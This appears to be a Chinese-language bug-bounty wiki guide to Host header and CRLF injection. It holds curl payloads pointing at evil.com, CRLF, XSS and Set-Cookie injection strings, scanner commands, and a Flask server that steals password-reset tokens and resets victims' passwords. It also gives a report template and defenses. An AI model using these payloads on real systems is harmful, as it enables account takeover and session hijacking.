---
type: wiki
category: attack
tool: burp,curl,manual
status: active
last-updated: 2026-04-21
---

# Host Header Injection + CRLF Injection 指南（2026 版）

> **用途：** Host header injection 能打 password reset poisoning（高獎金 ATO 鏈）、cache poisoning、SSRF；CRLF injection 能做 response splitting、session fixation、XSS。
> 兩者在 2026 被 WAF / 新框架逐步擋住，但只要 reverse proxy 鏈複雜（CDN→LB→Nginx→App）就還有縫。

## 0. 原理

### 0.1 Host Header Injection

App 用 `request.headers['Host']` 構造：
- Password reset link
- Email 通知連結
- 重定向 URL
- OAuth callback

若未驗證 host → attacker 改 `Host: evil.com` → 連結變成 `https://evil.com/reset?token=xxx` → victim click → token 被 attacker 偷。

### 0.2 CRLF Injection

HTTP 用 `\r\n` 分隔 header / body。若 user input 進 header/redirect URL 沒過濾 → 注入 `\r\n\r\n<html>` → split response。

```
Location: /search?q=INJECT\r\n\r\n<html>hacked</html>
         → browser 收到 2 個 response → 第 2 個是攻擊者控制
```

## 1. Host Header Injection

### 1.1 偵測

```bash
# 改 Host 看 response 是否反射
curl -I https://target.com/ -H "Host: evil.com"

# 1. Response 裡有 evil.com → 反射
# 2. 重定向到 evil.com → 漏洞強證
# 3. Set-Cookie Domain=evil.com → cookie 被污染

# 某些 server 不認 Host，要用 X-Forwarded-Host / X-Host / X-Original-URL
curl -I https://target.com/ -H "X-Forwarded-Host: evil.com"
curl -I https://target.com/ -H "X-Host: evil.com"
curl -I https://target.com/ -H "X-Forwarded-Server: evil.com"
```

### 1.2 Password reset poisoning（高獎金鏈）

```bash
# 發 reset email
curl -X POST https://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@x.com"

# Email 中的 reset link 變成：
# https://evil.com/reset?token=ABC123
#         ↑ attacker-controlled domain

# Victim click → 到 attacker server → attacker 拿 token → 去 target.com/reset?token=ABC123 重設 victim 密碼 → ATO
```

**提升成功率技巧**：

```bash
# 用 X-Forwarded-Host（更常被讀）
curl -X POST https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@x.com"

# 多 Host header（HPP）
curl -X POST https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "Host: evil.com" \
  -d "email=victim@x.com"

# port 插入
curl -H "Host: target.com:attacker.com"  # 某些 parser 取 port 段
```

### 1.3 Absolute URL bypass

```bash
# SSRF-like
curl https://target.com/ \
  -H "Host: evil.com" \
  --request-target "https://target.com/admin"

# GET https://target.com/admin HTTP/1.1
# Host: evil.com
# → server 收到 absolute URI 會依哪個 host 路由？
```

Nginx `proxy_pass` 若用 `$host` 而非 `$proxy_host` → routing 依 Host header 決定 → SSRF 到任意 backend。

### 1.4 Cache poisoning via Host

```bash
# CDN cache key 不含 X-Forwarded-Host
curl https://target.com/home \
  -H "X-Forwarded-Host: evil.com"

# 若 response reflect X-Forwarded-Host 且被 cache → 下個使用者拿到注入的 response
# 詳見 [64-cache-poisoning.md]
```

### 1.5 Email 通知連結劫持

```bash
# 邀請 / 確認 email
curl -X POST https://target.com/invite \
  -H "Host: evil.com" \
  -d "email=target@victim.com&role=admin"

# Email 中 accept link 變 https://evil.com/accept?token=xxx
```

## 2. CRLF Injection

### 2.1 偵測

```bash
# URL / query param 測試
curl -v "https://target.com/redirect?url=https://evil.com/%0d%0aX-Injected:yes"

# Response headers 含 `X-Injected: yes` → vulnerable
```

**URL 編碼變體**：

```
%0d%0a   ← 標準 CRLF
%E5%98%8A%E5%98%8D ← UTF-8 double-encoded（某些 parser 會 decode 二次）
%0a%0d   ← 反順序
%00%0d%0a ← null 加 CRLF
%23%0d%0a ← #fragment + CRLF
```

### 2.2 Redirect CRLF

```
GET /redirect?url=foo%0d%0aContent-Length:%2015%0d%0a%0d%0a<script>alert(1)</script>

# Response:
# Location: foo
# Content-Length: 15
#
# <script>alert(1)</script>
# → 第二份 response 是 attacker 的
```

### 2.3 Set-Cookie injection

```
?callback=x%0d%0aSet-Cookie:sessionid=attacker_value

# Response:
# Set-Cookie: sessionid=attacker_value
# → session fixation
```

### 2.4 Response splitting → XSS

```
?lang=en%0d%0a%0d%0a<script>alert(1)</script>

# Response headers 結束後直接插 HTML → XSS
# 但現代 browser 多數不會 parse 第二 response，此 technique 已式微
```

### 2.5 CRLF via proxy chain

```
GET /api?x=1%0d%0aHost:internal.service.local HTTP/1.1

# 某些 proxy 會把 input 當 header 轉給 backend
```

### 2.6 HTTP/2 → HTTP/1.1 downgrade CRLF

2024-2026 新玩法：HTTP/2 pseudo-header 注入 `\r\n` 被 downgrade 成合法 HTTP/1.1 headers（詳見 [60-request-smuggling.md](60-request-smuggling.md) H2.CL / H2.TE）。

## 3. 常見 sink 搜尋

### 3.1 Backend code 審計

```bash
# 找 Host 使用
grep -r 'request.headers\["Host"\]\|HTTP_HOST\|getServerName\|getHeader("Host")\|request.get_host\|$_SERVER\["HTTP_HOST"\]' src/

# 找 CRLF sink
grep -r 'header\|redirect\|Location\|Set-Cookie\|append' src/ | grep -v sanitize
```

### 3.2 Framework 預設行為

| Framework | `Host` 默認行為 |
|-----------|-----------------|
| Django | `ALLOWED_HOSTS` 強制白單（1.5+ 預設開啟）|
| Rails | `config.hosts` 白單（6.0+）|
| Spring | 無默認（看 `X-Forwarded-Host` + `server.forward-headers-strategy`）|
| Express | 無默認，要自己 validate |
| Flask | 無默認 |
| Laravel | `App\Providers\TrustedProxyServiceProvider` |

### 3.3 Reverse proxy

```nginx
# 安全
proxy_set_header Host target.com;
# 攻擊者無法注

# 不安全
proxy_set_header Host $host;
proxy_set_header Host $http_host;
# attacker-controlled
```

## 4. 工具

### 4.1 Burp

```
# 手動 repeater
# Intruder 用於 brute force X-* header 變體

# Extension：
- Param Miner（找 unkeyed header）
- HTTP Request Smuggler（H2 downgrade）
- CRLF injection scanner（Burp Pro built-in）
```

### 4.2 Nuclei

```bash
nuclei -u https://target.com -tags crlf,host-header
```

### 4.3 crlfuzz

```bash
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
crlfuzz -u https://target.com/?q=FUZZ
```

### 4.4 host-header-injection scanner

```bash
# ffuf + Host list
ffuf -u https://target.com/ -H "Host: FUZZ" -w /path/to/host-wordlist.txt -mc 200,301,302
```

## 5. 完整 PoC：X-Forwarded-Host → Password reset poisoning

### Step 1: 確認 reset endpoint

```bash
curl -X POST https://target.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@x.com"}'
# 200 OK → email 發出
```

### Step 2: 注入 X-Forwarded-Host

```bash
curl -X POST https://target.com/api/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@x.com"}'
```

### Step 3: 檢查 email 內容

```
Subject: Reset your password
Body: Click here: https://evil.com/reset?token=ABC123XYZ
                        ↑ attacker host
```

### Step 4: 起 evil.com 收 token

```python
# evil.com/app.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/reset')
def reset():
    token = request.args.get('token')
    print(f"Stolen token: {token}")
    # 背景去 target.com/reset?token={token} 重設 victim 密碼
    import requests
    requests.get(f"https://target.com/reset?token={token}&new=attacker_password")
    return "Redirecting..."
```

### Step 5: 送 social engineering email（可選，真實 exploit 時跳過，報告只寫）

Victim 點 evil.com link → attacker 拿 token → 即時 replay 到 target.com → victim 密碼被改 → ATO。

### Step 6: 報告

```markdown
## 漏洞概述
https://target.com/api/forgot-password 使用 X-Forwarded-Host 構造密碼重設
連結，未驗證 host 白單。攻擊者可注入任意 domain，使 reset email 中的
連結指向 attacker server → 竊取 reset token → 完整 ATO。

## 重現
[curl with X-Forwarded-Host: evil.com + email screenshot]

## Impact
- 完整 account takeover（任意帳號）
- 不需使用者互動（只要 email client 自動預覽 + 使用者點 "Reset" 按鈕）

## Severity
P1 / Critical（full ATO）

## 修補
1. 硬編碼 base URL（config 或 env var）構造 reset link
2. 驗證 Host / X-Forwarded-Host 白單
3. Reset link 加 HMAC：`sign(email+token+timestamp)`，server-side verify
4. reset token 5-10 分鐘過期 + 只能用一次
```

## 6. 防禦 checklist（寫修補建議用）

```
1. 所有構造 URL 的邏輯用 config hardcoded base URL
2. 驗證 Host header 白單（django ALLOWED_HOSTS / rails config.hosts）
3. 忽略 X-Forwarded-Host / X-Host / X-Original-URL（除非 trusted proxy）
4. 設 `X-Frame-Options: DENY` + `Strict-Transport-Security`
5. 輸入消毒：禁止 \r\n \x00 \x1F 控制字元進 header value
6. 使用 framework 現代 API，禁止 string concat Location header
7. 重定向 URL 做白單 validation（不信 query param）
8. Email 連結用獨立 domain 或 HMAC-signed path
9. Reset token 綁 IP / device fingerprint（可選）
```

## 關聯文件

- [60-request-smuggling.md](60-request-smuggling.md) — H2 downgrade CRLF
- [64-cache-poisoning.md](64-cache-poisoning.md) — Host / X-Forwarded-Host 作為 unkeyed header
- [65-csrf-deep.md](65-csrf-deep.md) — CRLF + Set-Cookie = session fixation
- PortSwigger Host header attacks：https://portswigger.net/web-security/host-header
- OWASP CRLF Injection：https://owasp.org/www-community/vulnerabilities/CRLF_Injection
- crlfuzz：https://github.com/dwisiswant0/crlfuzz
